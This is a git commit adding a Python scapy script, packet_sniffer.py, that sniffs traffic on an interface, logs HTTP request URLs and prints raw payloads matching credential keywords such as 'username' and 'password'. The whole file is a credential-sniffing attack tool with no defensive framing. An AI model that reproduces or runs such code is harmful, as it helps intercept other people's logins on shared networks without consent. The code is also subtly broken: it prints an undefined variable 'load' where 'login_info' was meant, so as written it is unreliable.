9baff3178b6da1127a209c95f5c9ca84a85c1a59
RebelSlicer <54483464+RebelSlicer@users.noreply.github.com>
2019-12-10 14:02:55 -0500

    Add files via upload

---
+++ packet_sniffer.py
@@ -0,0 +1,29 @@
+#!/usr/bin/env python
+
+import scapy.all as scapy
+from scapy.layers import http
+
+def sniff(interface):
+    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+def get_login_information(packet):
+    if packet.haslayer(scapy.Raw):
+        load = packet[scapy.Raw].load
+        keywords = ["uname", "user", "username", "email", "login", "pass", "password", "secret", "name"]
+        for keyword in keywords:
+            if keyword in load:
+                return load
+
+def process_sniffed_packet(packet):
+    if packet.haslayer(http.HTTPRequest):
+        url = get_url(packet)
+        print("[+] HTTP Request >>>> " + url)
+        login_info = get_login_information(packet)
+        if login_info:
+            print("\n\n[+] Possible username/password >>>> " + load + "\n\n")
+
+
+sniff("eth0")
